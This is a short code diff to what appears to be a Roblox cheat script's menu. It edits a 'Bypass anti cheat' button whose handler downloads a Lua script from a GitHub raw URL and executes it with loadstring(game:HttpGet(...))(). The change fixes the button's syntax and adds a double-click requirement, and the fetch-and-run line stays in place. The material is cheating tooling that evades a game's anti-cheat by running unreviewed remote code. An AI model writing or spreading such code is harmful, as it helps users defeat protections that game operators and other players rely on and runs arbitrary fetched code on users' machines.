@@ -21,10 +21,10 @@ local Button = LeftGroupbox:AddButton({
     DoubleClick = false -- Requires double-click for risky actions
 })
 
-local Button = RightGroupbox:Addbutton({
-    Text = "Bypass Anticheat",
-    Func = function
+local Button = Groupbox:AddButton({
+    Text = "Bypass anti cheat",
+    Func = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/refs/heads/main/main.lua",true))()
     end,
-    DoubleClick = false
+    DoubleClick = true -- Requires double-click for risky actions
 })
